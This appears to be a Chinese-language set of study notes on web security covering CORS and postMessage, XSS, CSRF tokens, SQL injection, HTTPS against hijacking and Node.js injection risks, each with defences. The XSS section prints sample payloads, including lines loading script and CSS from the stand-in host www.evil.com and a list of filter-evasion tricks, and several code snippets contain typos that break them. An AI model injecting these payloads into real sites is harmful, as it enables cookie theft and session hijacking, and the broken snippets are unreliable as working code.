## 常见的web攻击原理与防御
### 跨域与同源策略
跨域方式：
- postMessage(html5)
- 请求头Origin与响应头Access-Contorl-Allow-Origin(XmlHttpRequest2.0)
- 其他跨域方式


#### postMesage
在postMessage进行跨域发送和接受时进行严格的域名来源限制
>示例:从A页面（www.abc.com)跨域发消息到B页面（api.abc.com)
页面A
```
var mesg = {title:'information',desc:'say hello world'}
//var tarfetOrigin = '*'  //targetOrigin为'*'号时，可能将导致数据泄露到恶意站点

var tarfetOrigin = 'http://api.abc.com'  //需制定接收消息窗口的origin，慎用* 
var frameB = document.getElementById('pageB')
frameB.contentWindow.postMessage(msg,targetOrigin)
```
页面B
```
window.addEventListener('message',onReceivedMessage,false)
function onReceivedMessage(event){
    var origin = event.origin || event.originEvent.origin
    if(origin != 'http://www.abc.com'){
        return
    }else{
        //do something
    }
}
```

#### Access-Control-Allow-Origin
服务端设置Access-Control-Allow-Origin

安全的做法：查询域名是否在白名单，再设置Access-Control-Allow-Origin为当前的域名


### 跨站脚本攻击-XSS
cross-site scripting,通过在页面中注入脚本，然后触发执行，获取相应的权限。

#### 危害：
- 窃取Cookie
- 网络钓鱼
- 劫持会话
- 传播XSS蠕虫

#### XSS的分类与原理
- 反射型：恶意用户(恶意攻击)-->浏览器-->服务器-->浏览器-->普通用户
- 存储型：恶意用户(恶意攻击)-->浏览器-->服务器-->(数据库、日志)-->服务器-->浏览器(可能存储到cookie,localstorage等其他存储)--> 普通用户
 >区别，是否存储
- 基于DOM（反射型的一种）：恶意用户(攻击代码)-->浏览器-->页面-->(document.write(xss),node.innerHTML = XSS,node.outerHTML = XSS) -->页面-->浏览器-->普通用户

#### 示例
1.正常注入（sec,javascript) 
```
<img src="javascript:alert(/xss/)" width=100 />   
```
2.事件注入（onerror、onclick)
```
<img src="#" onerror="javascript:alert(/xss/)" />

<div onclick="javascript:alert(/xss/)"></div> 
```
3.通过css构造(background-img:url、expression、link-href、@import)
```
<div style="background-image:url(javascript:alert(xcss'));width:expression(alert('xss'))"></div>
<style>body{background-image:url("javascript:alert('xss')")}</style>
<link rel="stylesheet" href="http://www.evil.com/attack.css">
<style>@import 'javascript:alert('xss')'</style>
```
4.通过Javascript函数(eval()函数、ASCII编码)
```
<script>eval("alert('xss')")</script>
<img src="javascript:eval(String.fromaCharCode(97,108,123,34,45))" />
```
5.基于DOM型创建（有字数限制的输入框）
```
<script>z="document."</script>
<script>z=z+"write"</script>
<script>z=z+"alert"</script>
<script>z=z+"/xss/"</script>
<script>z=z+");"</script>
<script>eval(z)</script>
```
6.基于DOM型创建(创建节点)
```
var a = document.createElement('script')
a.src='http://www.evil.com/css.js'
document.getElementsByTagName('head')[o].appendChild(s)
```

#### XSS构造
- 通过html属性构造：src,lowsrc,dynsrc,bgsound,background,action,href,value...
- 通过html事件构造：onclick,onerror,onmouseover
- 通过css构造：@import,background-image:url,expression(IE)
- 通过javascript构造：javascript:eval()
- 基于DOM：document.write(),node.innerHTML,document.createElement()
- 注入代码变形构造：加空格、回车、Tab、\、\0、加注释、单引号、不用引号、用ASCII转码、转大小写、转全角

#### XSS的防御
- 避免使用客户端数据，尽量服务端生成
- javascript变量输出时先编码
- XSS过滤(js-css,http://jsxss.com)
- CSP(content security policy):通过在http响应头中加入相关指令告知浏览器，被保护页面仅允许加载和执行指令中限制的内容，不满足的资源与内容不执行或被客户端阻断


### 跨站请求伪造-CSRF
Cross-Site Request Forgery Forgery,普通用户在正常源站点登录后，在另外的中转站点执行了对源站点的请求(由恶意用户构造)，该请求利用源站点普通用户已有的登录态，来执行恶意用户的操作。

#### CSRF攻击防御
CSRF攻击防御-->服务端生成CSRF Token-->
1.Html 节点，如表单、标签属性等 
```
<input type="hidden" name="csrfToken" value="NjsdNJsaY"
```
2.Javascript变量 
```
window.csrfToken='sdsajGAau'
```
3.http响应时写cookie+Ajax 请求时加头
```
//响应内容,CSRF Token写到Cookie
set-cookie:Csrf-token=KsjaTysj.Path=/
//请求内容,从Cookie读取CSRF Token，并添加到请求头服务端进行校验
X-Requested-With:XMLHttpRequest
X-Csrf-Token:KsjaTysj
```
csrf token生成：
- 用密钥哈希算法：
```
var csrfToken = HMAC(sessionToken,key)
```
- 开源项目：Anti-csrf、csrf

### SQL注入攻击
SQL injection，通过在输入数据中构造额外的sql语句，在数据库进行非授权执行后得到相应的数据

#### SQL注入的危害
- 数据库信息泄漏
- 数据库信息被篡改
- 进行网页挂马
- 被远程控制

#### SQL注入攻击防御
- 转义特使字符、数据类别检查、最小化账号权限
- 使用ORM框架（如Hibernate）
- 使用数据库参数化查询（Prepared Query）

### 网络劫持
指客户端在于服务端进行信息通讯，在经过中间的网络链路时，有可能被中间主机设备服务器劫持会话，窃取相关信息或篡改请求响应报文。 

#### 网络劫持防御
- 使用https防御网络劫持：https是HTTP的安全版本，加入了SSL/TLS协议，依靠证书来验证服务器的身份，并为浏览器和服务器之间的传输层提供通信加密。
>SSL/TLS是属于会话层协议
SSL握手协议：数据传输前通讯双方进行身份认证、协商加密算法、交换加密密钥
SSL记录协议：数据封装、压缩、加密支持

HTTPS三大功能
1. 身份认证-防冒充，确保正确的用户访问到正确的网站
2. 数据加密-防窃听，第三方无法直接查看原始内容
3. 数据一致性-防篡改，防抵赖及时发现第三方对内容的篡改

### NodeJS的安全问题
- 字符串注入攻击问题
eval()函数,new Function(string),setInterval(string,time),setTimeout(string,time)

- 命令注入问题
child_processexec('ls',function(err,data){console.log(data)}

- 其他安全问题
启动node启程时，可能启动了超级管理员的账号，此时nodejs会报错，抛一些错误信息，可能透露一些敏感信息。此时，可以进行相应的措施，比如用严格模式，屏蔽掉错误等

## 开发中安全意识
### 安全意识：
- 不要相信任何清请求数据
    - 文本请求数据
    - 上传的文件
    
- 在多个缓解均作安全校验
    - 前端
    - 服务端
    - 数据库
    
- 关键敏感信息加密
    - 账号
    - 密码
    - 身份证信息
    - ...
    
#### 请求数据校验
- 数据格式（长度、类型、规范）
- 业务合法性校验（比如中文）
- 文件头校验（针对上传文件，比如文件头前N个字节检查）
